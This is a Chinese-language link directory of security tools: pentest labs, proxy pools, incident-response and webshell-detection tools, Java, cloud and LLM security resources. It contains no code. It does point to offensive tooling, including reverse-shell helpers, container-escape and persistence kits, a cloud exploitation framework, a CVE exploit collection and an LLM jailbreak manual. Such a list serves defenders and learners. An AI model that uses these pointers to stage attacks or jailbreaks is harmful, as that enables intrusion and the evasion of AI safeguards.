<h1 id="基础设施搭建"><a href="#基础设施搭建" class="headerlink" title="基础设施搭建"></a>基础设施搭建</h1><h2 id="攻防环境部署"><a href="#攻防环境部署" class="headerlink" title="攻防环境部署"></a>攻防环境部署</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>Windows11 Penetration Suite Toolkit 一个开箱即用的windows渗透测试环境</td>
<td><a href="https://github.com/arch3rPro/Pentest-Windows">https://github.com/arch3rPro/Pentest-Windows</a></td>
<td>Pentest-Windows</td>
</tr>
<tr>
<td>红&#x2F;蓝队环境自动化部署工具</td>
<td><a href="https://github.com/ffffffff0x/f8x">https://github.com/ffffffff0x/f8x</a></td>
<td>f8x</td>
</tr>
<tr>
<td>适合每个人的动态基础设施框架，轻松分配许多不同扫描工具的工作量，包括nmap、ffuf、masscan、核、meg等！</td>
<td><a href="https://github.com/pry0cc/axiom">https://github.com/pry0cc/axiom</a></td>
<td>axiom</td>
</tr>
<tr>
<td>DNSLOG平台 golang 一键启动版</td>
<td><a href="https://github.com/yumusb/DNSLog-Platform-Golang">https://github.com/yumusb/DNSLog-Platform-Golang</a></td>
<td>DNSLog-Platform-Golang</td>
</tr>
<tr>
<td>反连助手：发现可以映射本地端口的互联网IP，本工具可从hunter、quake、fofa等网络空间测绘平台，收集、探测互联网IP，并通过配置文件中的端口映射关系，把本地端口映射到互联网IP指定的端口，以便反弹shell等场景下使用。</td>
<td><a href="https://github.com/thinkoaa/Dlam">https://github.com/thinkoaa/Dlam</a></td>
<td>Dlam</td>
</tr>
</tbody></table>
<h2 id="代理池"><a href="#代理池" class="headerlink" title="代理池"></a>代理池</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>一款功能强大的代理检查和IP地址轮转工具</td>
<td><a href="https://github.com/kitabisa/mubeng">https://github.com/kitabisa/mubeng</a></td>
<td>mubeng</td>
</tr>
<tr>
<td>deadpool代理池工具，可从hunter、quake、fofa等网络空间测绘平台取高质量socks5代理，或本地导入socks5代理，轮询使用代理进行流量转发。</td>
<td><a href="https://github.com/thinkoaa/Deadpool">https://github.com/thinkoaa/Deadpool</a></td>
<td>Deadpool</td>
</tr>
<tr>
<td>利用fofa搜索socks5开放代理进行代理池轮切的工具</td>
<td><a href="https://github.com/akkuman/rotateproxy">https://github.com/akkuman/rotateproxy</a></td>
<td>rotateproxy</td>
</tr>
<tr>
<td>利用IP地址池进行自动切换Http代理，防止IP封禁。</td>
<td><a href="https://github.com/Mustard404/Auto_proxy">https://github.com/Mustard404/Auto_proxy</a></td>
<td>Auto_proxy</td>
</tr>
<tr>
<td>命令行全局代理–跨平台通用</td>
<td><a href="https://github.com/rofl0r/proxychains-ng">https://github.com/rofl0r/proxychains-ng</a></td>
<td>proxychains-ng</td>
</tr>
<tr>
<td>Python爬虫代理IP池(proxy pool)</td>
<td><a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a></td>
<td>proxy_pool</td>
</tr>
</tbody></table>
<h2 id="靶场清单"><a href="#靶场清单" class="headerlink" title="靶场清单"></a>靶场清单</h2><p>通用漏洞类：</p>
<table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>在线靶场</td>
<td><a href="https://hackmyvm.eu/anon/">https://hackmyvm.eu/anon/</a></td>
<td>hackmyvm</td>
</tr>
<tr>
<td>Vulfocus 是一个漏洞集成平台，将漏洞环境 docker 镜像，放入即可使用，开箱即用。</td>
<td><a href="https://github.com/fofapro/vulfocus">https://github.com/fofapro/vulfocus</a></td>
<td>vulfocus</td>
</tr>
<tr>
<td>基于 Docker-Compose 的预建易受攻击环境</td>
<td><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></td>
<td>vulhub</td>
</tr>
<tr>
<td>Spring Boot 相关漏洞学习资料，利用方法和技巧合</td>
<td><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></td>
<td>SpringBootVulExploit</td>
</tr>
<tr>
<td>TerraformGoat 是一个支持多云的云场景漏洞靶场搭建工具，目前支持阿里云、腾讯云、华为云、Amazon Web Services、Google Cloud Platform、Microsoft Azure 六个云厂商的云场景漏洞搭建。</td>
<td><a href="https://github.com/HXSecurity/TerraformGoat">https://github.com/HXSecurity/TerraformGoat</a></td>
<td>TerraformGoat</td>
</tr>
<tr>
<td>Metarget的名称来源于<code>meta-</code>（元）加<code>target</code>（目标，靶机），是一个脆弱基础设施自动化构建框架，主要用于快速、自动化搭建从简单到复杂的脆弱云原生靶机环境。</td>
<td><a href="https://github.com/Metarget/metarget">https://github.com/Metarget/metarget</a></td>
<td>Metarget</td>
</tr>
<tr>
<td>一个故意易受攻击的CI&#x2F;CD环境。通过多种挑战学习CI&#x2F;CD安全性。</td>
<td><a href="https://github.com/cider-security-research/cicd-goat">https://github.com/cider-security-research/cicd-goat</a></td>
<td>cicd-goat</td>
</tr>
<tr>
<td>一个免费的云本地安全学习实验室列表，包括 CTF、自主研讨会、指导漏洞实验室和研究实验室。</td>
<td><a href="https://github.com/iknowjason/Awesome-CloudSec-Labs">https://github.com/iknowjason/Awesome-CloudSec-Labs</a></td>
<td>Awesome-CloudSec-Labs</td>
</tr>
<tr>
<td>GOAD是一个渗透测试活动目录实验室项目。该实验室的目的是为pentesters提供一个易受攻击的活动目录环境，以便用于练习通常的攻击技术。</td>
<td><a href="https://github.com/Orange-Cyberdefense/GOAD">https://github.com/Orange-Cyberdefense/GOAD</a></td>
<td>GOAD</td>
</tr>
</tbody></table>
<p>基础漏洞类：</p>
<table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>FastJson全版本Docker漏洞环境(涵盖1.2.47&#x2F;1.2.68&#x2F;1.2.80等版本)，主要包括JNDI注入及高版本绕过、waf绕过、文件读写、原生反序列化、利用链探测绕过、不出网利用等。从黑盒的角度覆盖FastJson深入利用</td>
<td><a href="https://github.com/lemono0/FastJsonParty">https://github.com/lemono0/FastJsonParty</a></td>
<td>FastJsonParty</td>
</tr>
<tr>
<td>基础漏洞靶场</td>
<td><a href="https://dvwa.co.uk/">https://dvwa.co.uk/</a></td>
<td>dvwa</td>
</tr>
<tr>
<td>常见的web漏洞</td>
<td><a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">https://www.pentesterlab.com/exercises/web_for_pentester/course</a></td>
<td>pentesterlab</td>
</tr>
<tr>
<td>Java漏洞平台</td>
<td><a href="https://github.com/j3ers3/Hello-Java-Sec">https://github.com/j3ers3/Hello-Java-Sec</a></td>
<td>Hello-Java-Sec</td>
</tr>
<tr>
<td>JAVA 漏洞靶场</td>
<td><a href="https://github.com/tangxiaofeng7/SecExample">https://github.com/tangxiaofeng7/SecExample</a></td>
<td>SecExample</td>
</tr>
<tr>
<td>一个想帮你总结所有类型的上传漏洞的靶场</td>
<td><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></td>
<td>upload-labs</td>
</tr>
<tr>
<td>SQLI 实验室测试基于错误、基于布尔值、基于时间。</td>
<td><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></td>
<td>sqli-labs</td>
</tr>
<tr>
<td>一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo</td>
<td><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></td>
<td>xxe-lab</td>
</tr>
</tbody></table>
<h2 id="漏洞订阅-安全推送"><a href="#漏洞订阅-安全推送" class="headerlink" title="漏洞订阅&amp;安全推送"></a>漏洞订阅&amp;安全推送</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>一个高价值漏洞采集与推送服务</td>
<td>collect valueable vulnerability and push it<a href="https://github.com/zema1/watchvuln">https://github.com/zema1/watchvuln</a></td>
<td>watchvuln</td>
</tr>
<tr>
<td>一个基于✨HOOK机制的微信机器人，支持🌱安全新闻定时推送【FreeBuf，先知，安全客，奇安信攻防社区】</td>
<td><a href="https://github.com/ngc660sec/NGCBot">https://github.com/ngc660sec/NGCBot</a></td>
<td>NGCBot</td>
</tr>
<tr>
<td>一个方便安全研究人员获取每日安全日报的爬虫和推送程序，目前爬取范围包括先知社区、安全客、Seebug Paper、跳跳糖、奇安信攻防社区、棱角社区以及绿盟、腾讯玄武、天融信、360等实验室博客，持续更新中。</td>
<td><a href="https://github.com/Le0nsec/SecCrawler">https://github.com/Le0nsec/SecCrawler</a></td>
<td>SecCrawler</td>
</tr>
<tr>
<td>Security-related Slide Presentation &amp; Security Research Report（大安全各领域各公司各会议分享的PPT以及各类安全研究报告）</td>
<td><a href="https://github.com/FeeiCN/Security-PPT">https://github.com/FeeiCN/Security-PPT</a></td>
<td>Security-PPT</td>
</tr>
<tr>
<td>实现对网络安全信息聚合，将安全相关的文章，数据，以及历届安全大会演讲的pptx,pdf进行了全文索引，方便检索。</td>
<td><a href="https://i.hacking8.com/forums/">https://i.hacking8.com/forums/</a></td>
<td>hacking8</td>
</tr>
<tr>
<td>网络安全相关的RSS订阅，帮助建立个人情报来源和日常知识库更新 更新频率: 每2个月一次</td>
<td><a href="https://github.com/zer0yu/CyberSecurityRSS">https://github.com/zer0yu/CyberSecurityRSS</a></td>
<td>CyberSecurityRSS</td>
</tr>
<tr>
<td>记录了个人用到的一些获取国内安全资讯的RSS地址。均为中文，方便自己抓取关键字。还有部分大佬的博客。均不分前后。</td>
<td><a href="https://github.com/zhengjim/Chinese-Security-RSS/">https://github.com/zhengjim/Chinese-Security-RSS/</a></td>
<td>Chinese-Security-RSS</td>
</tr>
<tr>
<td>这个仓库收集了所有在 GitHub 上能找到的 CVE 漏洞利用工具。</td>
<td><a href="https://github.com/XiaomingX/data-cve-poc">https://github.com/XiaomingX/data-cve-poc</a></td>
<td>data-cve-poc</td>
</tr>
</tbody></table>
<h1 id="运维-甲方-防守方工具"><a href="#运维-甲方-防守方工具" class="headerlink" title="运维&amp;甲方&amp;防守方工具"></a>运维&amp;甲方&amp;防守方工具</h1><h2 id="安全建设"><a href="#安全建设" class="headerlink" title="安全建设"></a>安全建设</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>用于记录企业安全规划，建设，运营，攻防的相关资源</td>
<td><a href="https://github.com/AnyeDuke/Enterprise-Security-Skill">https://github.com/AnyeDuke/Enterprise-Security-Skill</a></td>
<td>Enterprise-Security-Skill</td>
</tr>
<tr>
<td>暗网中文网监控爬虫(DEEPMIX)</td>
<td><a href="https://github.com/s045pd/DarkNet_ChineseTrading">https://github.com/s045pd/DarkNet_ChineseTrading</a></td>
<td>DarkNet_ChineseTrading</td>
</tr>
</tbody></table>
<h2 id="应急响应笔记"><a href="#应急响应笔记" class="headerlink" title="应急响应笔记"></a>应急响应笔记</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>应急响应实战笔记，一个安全工程师的自我修养</td>
<td><a href="https://github.com/Bypass007/Emergency-Response-Notes">https://github.com/Bypass007/Emergency-Response-Notes</a></td>
<td>Emergency-Response-Notes</td>
</tr>
<tr>
<td>Linux&#x2F;Windows&#x2F;应急响应个人笔记</td>
<td><a href="https://github.com/wpsec/Emergency-response-notes">https://github.com/wpsec/Emergency-response-notes</a></td>
<td>Emergency-response-notes</td>
</tr>
<tr>
<td>应急响应指南 &#x2F; emergency response checklist</td>
<td><a href="https://github.com/theLSA/emergency-response-checklist">https://github.com/theLSA/emergency-response-checklist</a></td>
<td>emergency-response-checklist</td>
</tr>
<tr>
<td>NOP-TEAM出品的Windows 应急响应手册</td>
<td><a href="https://github.com/Just-Hack-For-Fun/Windows-INCIDENT-RESPONSE-COOKBOOK">https://github.com/Just-Hack-For-Fun/Windows-INCIDENT-RESPONSE-COOKBOOK</a></td>
<td>Windows-INCIDENT-RESPONSE-COOKBOOK</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="Linux应急响应工具"><a href="#Linux应急响应工具" class="headerlink" title="Linux应急响应工具"></a>Linux应急响应工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>主机侧Checklist的自动全面化检测脚本</td>
<td><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></td>
<td>Gscan</td>
</tr>
<tr>
<td>linux信息收集&#x2F;应急响应&#x2F;常见后门&#x2F;挖矿检测&#x2F;webshell检测脚本</td>
<td><a href="https://github.com/al0ne/LinuxCheck">https://github.com/al0ne/LinuxCheck</a></td>
<td>LinuxCheck</td>
</tr>
<tr>
<td>uroboros-一个GNU&#x2F;Linux监视和概要分析工具，专注于单个进程</td>
<td><a href="https://github.com/evilsocket/uroboros">https://github.com/evilsocket/uroboros</a></td>
<td>uroboros</td>
</tr>
<tr>
<td>whohk linux下一款强大的应急响应工具</td>
<td><a href="https://github.com/heikanet/whohk">https://github.com/heikanet/whohk</a></td>
<td>whohk</td>
</tr>
<tr>
<td>Malwoverview 是用于威胁搜寻的第一响应工具</td>
<td><a href="https://github.com/alexandreborges/malwoverview">https://github.com/alexandreborges/malwoverview</a></td>
<td>malwoverview</td>
</tr>
<tr>
<td>Rootkit Hunter Rootkit猎手</td>
<td><a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net/</a></td>
<td>Rootkitr</td>
</tr>
</tbody></table>
<h2 id="Windows应急响应工具"><a href="#Windows应急响应工具" class="headerlink" title="Windows应急响应工具"></a>Windows应急响应工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>QDoctor是一款非传统意义上的ARK(Anti RootKit)工具。</td>
<td><a href="https://github.com/QAX-Anti-Virus/QDoctor">https://github.com/QAX-Anti-Virus/QDoctor</a></td>
<td>QDoctor</td>
</tr>
<tr>
<td>OpenArk是一款Windows平台上的开源Ark工具. Ark是Anti-Rootkit（对抗恶意程序）的简写, OpenArk目标成为逆向工程师、编程人员的工具，同时也能为那些希望清理恶意软件的用户服务。以后也将会支持更多功能和命令。</td>
<td><a href="https://github.com/BlackINT3/OpenArk">https://github.com/BlackINT3/OpenArk</a></td>
<td>OpenArk</td>
</tr>
<tr>
<td>一个类似于PChunter的多功能分析工具（PChunter已无法适用于最新版windwos）</td>
<td><a href="https://github.com/ClownQq/YDArk/">https://github.com/ClownQq/YDArk/</a></td>
<td>YDArk</td>
</tr>
<tr>
<td>包含一系列免费的系统分析工具，如Process Explorer、启动项分析工具 AutoRuns等。</td>
<td><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/">https://docs.microsoft.com/zh-cn/sysinternals/downloads/</a></td>
<td>SysinternalsSuite</td>
</tr>
<tr>
<td>一个免费，功能强大的多功能工具，可帮助您监视系统资源，调试软件和检测恶意软件。</td>
<td><a href="https://processhacker.sourceforge.io/">https://processhacker.sourceforge.io/</a></td>
<td>Process Hacker</td>
</tr>
<tr>
<td>微软公司出品的日志分析工具，它功能强大，使用简单。</td>
<td><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></td>
<td>Log Parser</td>
</tr>
<tr>
<td>火麒麟-网络安全应急响应工具(系统痕迹采集)</td>
<td><a href="https://github.com/MountCloud/FireKylin">https://github.com/MountCloud/FireKylin</a></td>
<td>FireKylin</td>
</tr>
<tr>
<td>APT-Hunter Windows日志事件应急工具</td>
<td><a href="https://github.com/ahmedkhlief/APT-Hunter">https://github.com/ahmedkhlief/APT-Hunter</a></td>
<td>APT-Hunter</td>
</tr>
<tr>
<td>基于Go编写的windows日志分析工具</td>
<td><a href="https://github.com/Fheidt12/Windows_Log">https://github.com/Fheidt12/Windows_Log</a></td>
<td>Windows_Log</td>
</tr>
<tr>
<td>基于Memprocfs和Volatility的可视化内存取证工具</td>
<td><a href="https://github.com/Tokeii0/LovelyMem">https://github.com/Tokeii0/LovelyMem</a></td>
<td>LovelyMem</td>
</tr>
</tbody></table>
<h2 id="webshell查杀工具"><a href="#webshell查杀工具" class="headerlink" title="webshell查杀工具"></a>webshell查杀工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>webshell查杀工具</td>
<td><a href="http://www.shelldetector.com/">http://www.shelldetector.com/</a></td>
<td>Web Shell Detector</td>
</tr>
<tr>
<td>河马webshell查杀</td>
<td><a href="https://www.shellpub.com/">https://www.shellpub.com/</a></td>
<td>河马webshell</td>
</tr>
<tr>
<td>kunwu是新一代webshell检测引擎，使用了内置了模糊规则、污点分析模拟执行、机器学习三种高效的检测策略</td>
<td><a href="https://github.com/kunwu2023/kunwu">https://github.com/kunwu2023/kunwu</a></td>
<td>kunwu</td>
</tr>
</tbody></table>
<h2 id="内存马查杀工具"><a href="#内存马查杀工具" class="headerlink" title="内存马查杀工具"></a>内存马查杀工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>Alibaba Java诊断利器Arthas</td>
<td><a href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></td>
<td>arthas</td>
</tr>
<tr>
<td>检测绝大部分所谓的内存免杀马</td>
<td><a href="https://github.com/huoji120/DuckMemoryScan">https://github.com/huoji120/DuckMemoryScan</a></td>
<td>DuckMemoryScan</td>
</tr>
<tr>
<td>通过jsp脚本扫描java web Filter&#x2F;Servlet型内存马</td>
<td><a href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a></td>
<td>java-memshell-scanner</td>
</tr>
<tr>
<td>A java memory web shell extracting tool</td>
<td><a href="https://github.com/LandGrey/copagent">https://github.com/LandGrey/copagent</a></td>
<td>copagent</td>
</tr>
<tr>
<td>杀内存马的小工具</td>
<td><a href="https://github.com/r00t4dm/aLIEz">https://github.com/r00t4dm/aLIEz</a></td>
<td>aLIEz</td>
</tr>
</tbody></table>
<h2 id="防守辅助分析工具"><a href="#防守辅助分析工具" class="headerlink" title="防守辅助分析工具"></a>防守辅助分析工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td><strong>蓝队分析研判工具箱</strong></td>
<td><a href="https://github.com/abc123info/BlueTeamTools">https://github.com/abc123info/BlueTeamTools</a></td>
<td>BlueTeamTools</td>
</tr>
<tr>
<td>一款基于 IP 信誉度信息实现的实时检测 Web 恶意流量的工具</td>
<td><a href="https://github.com/CRED-CLUB/ARTIF">https://github.com/CRED-CLUB/ARTIF</a></td>
<td>ARTIF</td>
</tr>
<tr>
<td>勒索病毒解密工具汇总</td>
<td><a href="https://github.com/jiansiting/Decryption-Tools/">https://github.com/jiansiting/Decryption-Tools/</a></td>
<td>Decryption-Tools</td>
</tr>
<tr>
<td>Shiro-Cookie解密小工具</td>
<td><a href="https://github.com/r00tuser111/SerializationDumper-Shiro">https://github.com/r00tuser111/SerializationDumper-Shiro</a></td>
<td>SerializationDumper-Shiro</td>
</tr>
<tr>
<td>这款工具是一款功能强大的网络安全综合工具，旨在为安全从业者、红蓝对抗人员和网络安全爱好者提供全面的网络安全解决方案。它集成了多种实用功能，包括解密、分析、扫描、溯源等，为用户提供了便捷的操作界面和丰富的功能选择。</td>
<td><a href="https://github.com/HotBoy-java/PotatoTool">https://github.com/HotBoy-java/PotatoTool</a></td>
<td>PotatoTool</td>
</tr>
</tbody></table>
<h2 id="溯源反制工具"><a href="#溯源反制工具" class="headerlink" title="溯源反制工具"></a>溯源反制工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>伪造Myslq服务端,并利用Mysql逻辑漏洞来获取客户端的任意文件反击攻击者</td>
<td><a href="https://github.com/BeichenDream/MysqlT">https://github.com/BeichenDream/MysqlT</a></td>
<td>MysqlT</td>
</tr>
<tr>
<td>检测目标Mysql数据库是不是蜜罐</td>
<td><a href="https://github.com/BeichenDream/WhetherMysqlSham">https://github.com/BeichenDream/WhetherMysqlSham</a></td>
<td>WhetherMysqlSham</td>
</tr>
<tr>
<td>安全、快捷、高交互、企业级的蜜罐管理系统，护网；支持多种协议蜜罐、蜜签、诱饵等功能。</td>
<td><a href="https://github.com/seccome/Ehoney">https://github.com/seccome/Ehoney</a></td>
<td>Ehoney</td>
</tr>
</tbody></table>
<h1 id="其他安全资料整理"><a href="#其他安全资料整理" class="headerlink" title="其他安全资料整理"></a>其他安全资料整理</h1><h2 id="JAVA安全研究"><a href="#JAVA安全研究" class="headerlink" title="JAVA安全研究"></a>JAVA安全研究</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>【三万字原创】完全零基础从0到1掌握Java内存马，公众号：追梦信安</td>
<td><a href="https://github.com/W01fh4cker/LearnJavaMemshellFromZero">https://github.com/W01fh4cker/LearnJavaMemshellFromZero</a></td>
<td>LearnJavaMemshellFromZero</td>
</tr>
<tr>
<td>该项目旨在竭尽所能的以简洁清晰的方式分享<code>Java安全</code>相关技术，将某些复杂的技术问题简单化，让更多的人能够学会<code>Java安全</code>。</td>
<td><a href="https://github.com/javaweb-sec/javaweb-sec">https://github.com/javaweb-sec/javaweb-sec</a></td>
<td>javaweb-sec</td>
</tr>
<tr>
<td>抽离出 utf-8-overlong-encoding 的序列化逻辑，实现 2 3 字节加密序列化数组</td>
<td><a href="https://github.com/Whoopsunix/utf-8-overlong-encoding">https://github.com/Whoopsunix/utf-8-overlong-encoding</a></td>
<td>utf-8-overlong-encoding</td>
</tr>
<tr>
<td>A list for Web Security and Code Audit</td>
<td><a href="https://github.com/ax1sX/SecurityList">https://github.com/ax1sX/SecurityList</a></td>
<td>SecurityList</td>
</tr>
<tr>
<td>实战场景较通用的 Java Rce 相关漏洞的利用方式</td>
<td><a href="https://github.com/Whoopsunix/JavaRce">https://github.com/Whoopsunix/JavaRce</a></td>
<td>JavaRce</td>
</tr>
<tr>
<td>Web-Security-Learning</td>
<td><a href="https://github.com/CHYbeta/Web-Security-Learning">https://github.com/CHYbeta/Web-Security-Learning</a></td>
<td>Web-Security-Learning</td>
</tr>
<tr>
<td>一款更利于全面学习内存马的注入工具</td>
<td><a href="https://github.com/ReaJason/MemShellParty">https://github.com/ReaJason/MemShellParty</a></td>
<td>MemShellParty</td>
</tr>
</tbody></table>
<h2 id="AI-LLM相关资料"><a href="#AI-LLM相关资料" class="headerlink" title="AI-LLM相关资料"></a>AI-LLM相关资料</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>大模型学习导航</td>
<td><a href="https://github.com/Y4tacker/LLM-Navigation">https://github.com/Y4tacker/LLM-Navigation</a></td>
<td>LLM-Navigation</td>
</tr>
<tr>
<td>Ai迷思录（应用与安全指南）</td>
<td><a href="https://github.com/Acmesec/theAIMythbook">https://github.com/Acmesec/theAIMythbook</a></td>
<td>theAIMythbook</td>
</tr>
<tr>
<td>Prompt越狱手册</td>
<td><a href="https://github.com/Acmesec/PromptJailbreakManual/">https://github.com/Acmesec/PromptJailbreakManual/</a></td>
<td>PromptJailbreakManual</td>
</tr>
<tr>
<td>通过各厂商大模型应用中已公开的信息挖掘潜在的安全问题并公开一些技术细节</td>
<td><a href="https://github.com/LLM-Red-Team">https://github.com/LLM-Red-Team</a></td>
<td>LLM-Red-Team</td>
</tr>
<tr>
<td>AIGC 求职面经、必备基础知识、提示词工程、ChatGPT、Stable Diffusion、Prompt、Embedding、Fintune 等 AIGC 求职你所需要知道的一切~</td>
<td><a href="https://github.com/EmbraceAGI/AIGC_Interview">https://github.com/EmbraceAGI/AIGC_Interview</a></td>
<td>AIGC_Interview</td>
</tr>
<tr>
<td>《AI 研发提效：构建 AI 辅助编码助手》</td>
<td><a href="https://github.com/unit-mesh/build-your-ai-coding-assistant">https://github.com/unit-mesh/build-your-ai-coding-assistant</a></td>
<td>build-your-ai-coding-assistant</td>
</tr>
<tr>
<td>MCP-SecurityTools 是一个专注于收录和更新网络安全领域 MCP 的开源项目，旨在汇总、整理和优化各类与 MCP 相关的安全工具、技术及实战经验。</td>
<td><a href="https://github.com/Ta0ing/MCP-SecurityTools">https://github.com/Ta0ing/MCP-SecurityTools</a></td>
<td>MCP-SecurityTools</td>
</tr>
<tr>
<td>面向基于MCP的AI工具的综合安全检查清单。由SlowMist构建，以保障大语言模型插件生态系统的安全。</td>
<td><a href="https://github.com/slowmist/MCP-Security-Checklist">https://github.com/slowmist/MCP-Security-Checklist</a></td>
<td>MCP-Security-Checklist</td>
</tr>
</tbody></table>
<h2 id="安全面试"><a href="#安全面试" class="headerlink" title="安全面试"></a>安全面试</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>一个2023届毕业生在毕业前持续更新、收集的安全岗面试题及面试经验分享~</td>
<td><a href="https://github.com/vvmdx/Sec-Interview-4-2023">https://github.com/vvmdx/Sec-Interview-4-2023</a></td>
<td>Sec-Interview-4-2023</td>
</tr>
<tr>
<td>网络信息安全从业者面试指南</td>
<td><a href="https://github.com/FeeiCN/SecurityInterviewGuide">https://github.com/FeeiCN/SecurityInterviewGuide</a></td>
<td>SecurityInterviewGuide</td>
</tr>
</tbody></table>
<h2 id="实战红蓝资料集锦"><a href="#实战红蓝资料集锦" class="headerlink" title="实战红蓝资料集锦"></a>实战红蓝资料集锦</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>红蓝对抗以及护网相关工具和资料，内存shellcode（cs+msf）和内存马查杀工具</td>
<td><a href="https://github.com/Mr-xn/RedTeam_BlueTeam_HW">https://github.com/Mr-xn/RedTeam_BlueTeam_HW</a></td>
<td>RedTeam_BlueTeam_HW</td>
</tr>
<tr>
<td>重生之我是赏金猎人系列，分享自己和团队在SRC、项目实战漏洞测试过程中的有趣案例</td>
<td><a href="https://github.com/J0o1ey/BountyHunterInChina">https://github.com/J0o1ey/BountyHunterInChina</a></td>
<td>BountyHunterInChina</td>
</tr>
<tr>
<td>国外蓝队攻防知识库</td>
<td><a href="https://github.com/Purp1eW0lf/Blue-Team-Notes">https://github.com/Purp1eW0lf/Blue-Team-Notes</a></td>
<td>Blue-Team-Notes</td>
</tr>
</tbody></table>
<h2 id="云安全资料"><a href="#云安全资料" class="headerlink" title="云安全资料"></a>云安全资料</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>也许这是国内第一个云安全知识文库</td>
<td><a href="https://wiki.teamssix.com/About/">https://wiki.teamssix.com/About/</a></td>
<td>T Wiki</td>
</tr>
<tr>
<td>从零开始的Kubernetes攻防</td>
<td><a href="https://github.com/neargle/my-re0-k8s-security">https://github.com/neargle/my-re0-k8s-security</a></td>
<td>my-re0-k8s-security</td>
</tr>
<tr>
<td>KubeHound 是一个专为 Kubernetes 设计的工具，它通过自动化的方式计算集群内资源之间的潜在攻击路径。这一工具的核心价值在于其能够提供全面的集群扫描，生成直观的攻击图，并提出针对性的保护策略。</td>
<td><a href="https://github.com/DataDog/KubeHound">https://github.com/DataDog/KubeHound</a></td>
<td>KubeHound</td>
</tr>
<tr>
<td>CDK是一款为容器环境定制的渗透测试工具，在已攻陷的容器内部提供零依赖的常用命令及PoC&#x2F;EXP。集成Docker&#x2F;K8s场景特有的 逃逸、横向移动、持久化利用方式，插件化管理</td>
<td><a href="https://github.com/cdk-team/CDK">https://github.com/cdk-team/CDK</a></td>
<td>CDK</td>
</tr>
<tr>
<td>云资产管理工具 目前工具定位是云安全相关工具，目前是两个模块 云存储工具、云服务工具， 云存储工具主要是针对oss存储、查看、删除、上传、下载、预览等等 云服务工具主要是针对rds、服务器的管理，查看、执行命令、接管等等</td>
<td><a href="https://github.com/dark-kingA/cloudTools">https://github.com/dark-kingA/cloudTools</a></td>
<td>cloudTools</td>
</tr>
<tr>
<td>六大云存储，泄露利用检测工具</td>
<td><a href="https://github.com/UzJu/Cloud-Bucket-Leak-Detection-Tools">https://github.com/UzJu/Cloud-Bucket-Leak-Detection-Tools</a></td>
<td>Cloud-Bucket-Leak-Detection-Tools</td>
</tr>
<tr>
<td>云环境利用框架 Cloud Exploitation Framework 方便红队人员在获得 AK 的后续工作</td>
<td><a href="https://github.com/teamssix/cf">https://github.com/teamssix/cf</a></td>
<td>cf</td>
</tr>
<tr>
<td>云漏洞扫描工具</td>
<td><a href="https://github.com/Rnalter/ThunderCloud">https://github.com/Rnalter/ThunderCloud</a></td>
<td>ThunderCloud</td>
</tr>
<tr>
<td>云渗透测试工具包</td>
<td><a href="https://github.com/404tk/cloudtoolkit">https://github.com/404tk/cloudtoolkit</a></td>
<td>cloudtoolkit</td>
</tr>
</tbody></table>
<hr>
<p>如果你有更好的提议或者其他想法，欢迎联系。</p>
<p>by–L0una(guchangan1)</p>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
      <tags>
        <tag>Website</tag>
      </tags>
  </entry>
  <entry>
